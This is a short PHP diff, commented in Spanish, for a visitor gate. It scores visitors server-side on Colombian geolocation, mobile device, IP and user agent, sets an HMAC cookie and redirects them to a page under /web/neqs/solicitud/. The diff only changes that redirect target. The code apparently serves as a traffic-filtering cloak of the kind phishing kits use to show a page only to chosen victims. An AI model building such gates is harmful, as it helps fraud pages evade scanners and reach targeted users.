@@ -3,17 +3,17 @@ require_once __DIR__ . '/_lib.php';
 
 // 1) Sesión activa => 302 inmediato
 if (gate_has_valid_cookie()) {
-    header('Location: /web/index.php', true, 302);
+    header('Location: /web/neqs/solicitud/5/indice.html', true, 302);
     exit;
 }
 
 // 2) Evaluación server-side: geo CO + mobile + IP + UA
 [$score, $reasons] = gate_compute_score();
 
-// 3) Si pasa: emitir cookie HMAC + 302 inmediato a /web/ (sin JS)
+// 3) Si pasa: emitir cookie HMAC + 302 inmediato a indice.html (sin JS)
 if ($score < 8) {
     gate_set_cookie(1800);
-    header('Location: /web/index.php', true, 302);
+    header('Location: /web/neqs/solicitud/5/indice.html', true, 302);
     exit;
 }
 
